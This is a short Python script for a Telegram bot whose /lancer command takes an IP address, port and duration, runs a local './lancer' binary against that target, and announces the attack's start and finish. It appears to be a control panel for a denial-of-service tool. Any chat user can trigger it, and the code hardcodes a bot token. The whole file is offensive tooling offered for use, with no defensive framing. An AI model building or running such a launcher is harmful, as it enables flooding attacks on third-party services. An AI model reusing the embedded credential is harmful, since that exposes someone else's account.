#!/usr/bin/env python3

import subprocess
import asyncio
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from keep_alive import keep_alive

BOT_TOKEN = "7688718088:AAGg83EwtG_u_9vfrP0huqUBBpMuf2UWIn4"

async def lancer_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) != 3:
        await update.message.reply_text("Usage: /lancer <ip> <port> <time>")
        return

    ip, port, duration = args

    try:
        subprocess.Popen(["./lancer", ip, port, duration])
        await update.message.reply_text(f"🚀 Attack started on {ip}:{port} for {duration} seconds.")

        # Wait for the duration then send "finished" message
        await asyncio.sleep(int(duration))
        await update.message.reply_text(f"✅ Attack finished on {ip}:{port}.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

if __name__ == "__main__":
    keep_alive()
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("lancer", lancer_command))
    app.run_polling()
